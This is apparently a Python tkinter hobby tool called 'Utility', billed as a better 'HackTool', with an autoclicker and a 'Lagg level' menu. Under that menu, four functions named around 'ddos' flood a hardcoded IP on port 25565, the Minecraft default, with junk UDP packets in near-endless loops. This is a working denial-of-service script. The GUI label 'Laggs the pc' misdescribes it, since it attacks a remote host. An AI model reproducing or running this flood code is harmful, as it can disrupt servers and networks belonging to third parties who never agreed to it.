import tkinter as tk
from tkinter import *
import time
import random
import os
import socket
import threading
import pyautogui
import keyboard

BG_COLOUR = "#2F3136"

timerhelper = 0

def autoclick():
    delay = 0.001

    autoclicker_on = False

    print("Press F6 to start the autoclicker")

    while True:
        if keyboard.is_pressed('F6'):
            autoclicker_on = not autoclicker_on
            print(f"Autoclicker {'bekapcsolva' if autoclicker_on else 'kikapcsolva'}.")
            time.sleep(0.3)

        if autoclicker_on:
            pyautogui.click()
            time.sleep(delay)
        if keyboard.is_pressed('J'):
            root.mainloop()

def gautoclick():
    root.withdraw()
    delay = 0.001

    autoclicker_on = False

    print("Press F6 to start the autoclicker")

    while True:
        if keyboard.is_pressed('F6'):
            autoclicker_on = not autoclicker_on
            print(f"Autoclicker {'bekapcsolva' if autoclicker_on else 'kikapcsolva'}.")
            time.sleep(0.3)

        if autoclicker_on:
            pyautogui.click()
            time.sleep(delay)
        if keyboard.is_pressed('J'):
            root.mainloop()
    

def helpMessage():
    update_label = tk.Label(root, background=BG_COLOUR, text="Opened help menu     ")
    update_label.grid(row=5, column=0, padx=10, pady=5, sticky="w")
    def buymeacoffee():
        os.system("Start https://buymeacoffee.com/Polokalap")
    def otherprojets():
        os.system("Start https://github.com/Polokalap")
    helproot = tk.Tk()
    helproot.title("Help")
    helproot.configure(background=BG_COLOUR)
    helproot.resizable(False, False)
    text_label = tk.Label(helproot, background=BG_COLOUR, text='Hi! My name is Polokalap! I am the developer of Utility! You can check out my other projects at https://github.com/Polokalap.\n This program is the "better" version of HackTool. The code is not open source yet, but I will maybe opensource it. \n If You Want to help me, You Can Buy me a coffee.')
    text_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
    buymeacoffee_button = tk.Button(helproot, text="Buy Me a Coffee", command=buymeacoffee)
    buymeacoffee_button.grid(row=7, column=15, padx=10, pady=10)
    otherprojects_button = tk.Button(helproot, text="Other Projects", command=otherprojets)
    otherprojects_button.grid(row=7, column=5, padx=10, pady=10)

def lagglevel():
    update_label = tk.Label(root, background=BG_COLOUR, text="Opened lagglevel     ")
    update_label.grid(row=5, column=0, padx=10, pady=5, sticky="w")
    def reallylowlagg():
        ip = "1.1.1.1"
        port = 25565
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ddos.connect((ip, port))
        for i in range(1000000000000):
            message = "]í]]í]]í]]í]]í]]í]]í]]í]]"
            time.sleep(0.0001)
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            if keyboard.is_pressed('J'):
                root.mainloop()
    def lowlagg():
        ip = "1.1.1.1"
        port = 25565
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ddos.connect((ip, port))
        for i in range(1000000000000):
            message = "]í]í]][}]<{}@&]€í]íí]í]í]í]í"
            time.sleep(0.0001)
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            if keyboard.is_pressed('J'):
                root.mainloop()
    def mediumlagg():
        ip = "1.1.1.1"
        port = 25565
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ddos.connect((ip, port))
        for i in range(1000000000000):
            time.sleep(0.0001)
            message = "łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]"
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            if keyboard.is_pressed('F6'):
                root.mainloop()
    def highlagg():
        ip = "1.1.1.1"
        port = 25565
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ddos.connect((ip, port))
        for i in range(1000000000000):
            message = "łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]łŁ$$ł;;}}$$í<ł}<}łŁíÍ€ÍŁííłŁí€Í]łíłí]íí][đ]đ[]Đđ[[]<<ł;í];]<}]<[Đf]"
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            ddos.sendto(message.encode(), (ip, port))
            if keyboard.is_pressed('J'):
                root.mainloop()
            

    lagglevelroot = tk.Tk()
    lagglevelroot.title("Lagg Level")
    lagglevelroot.configure(background=BG_COLOUR)
    lagglevelroot.resizable(False, False)
    lagglevel_label = tk.Label(lagglevelroot, background=BG_COLOUR, font="NotoSans-Regular",  text="Lagg level")
    lagglevel_label.grid(row=1, column=2, padx=10, pady=5, sticky="w")
    reallylow_button = tk.Button(lagglevelroot, text="Really low", command=reallylowlagg)
    reallylow_button.grid(row=2, column=1, padx=10, pady=10)
    low_button = tk.Button(lagglevelroot, text="Low", command=lowlagg)
    low_button.grid(row=2, column=2, padx=10, pady=10)
    medium_button = tk.Button(lagglevelroot, text="Medium", command=mediumlagg)
    medium_button.grid(row=2, column=3, padx=10, pady=10)
    high_button = tk.Button(lagglevelroot, text="High", command=highlagg)
    high_button.grid(row=2, column=4, padx=10, pady=10)
    

root = tk.Tk()
root.title("Utility")
root.configure(background=BG_COLOUR)
root.resizable(False, False)

ver_label = tk.Label(root, background=BG_COLOUR, text="Utility made By Polokalap")
ver_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")

help_button = tk.Button(root, text="help", command=helpMessage)
help_button.grid(row=1, column=5, padx=10, pady=10)

lagg_label = tk.Label(root, background=BG_COLOUR, text="Laggs the pc")
lagg_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
lagg_button = tk.Button(root, text="Start", command=lagglevel)
lagg_button.grid(row=2, column=1, padx=10, pady=10)

autoclicker_label = tk.Label(root, background=BG_COLOUR, text="Autoclicks")
autoclicker_label.grid(row=3, column=0, padx=10, pady=5, sticky="w")
autoclicker_button = tk.Button(root, text="Start", command=autoclick)
autoclicker_button.grid(row=3, column=1, padx=10, pady=10)
gautoclicker_button = tk.Button(root, text="Ghost Auto Clicker", command=gautoclick)
gautoclicker_button.grid(row=3, column=2, padx=10, pady=10)

update_label = tk.Label(root, background=BG_COLOUR, text="")
update_label.grid(row=5, column=1, padx=10, pady=5, sticky="w")

root.mainloop()
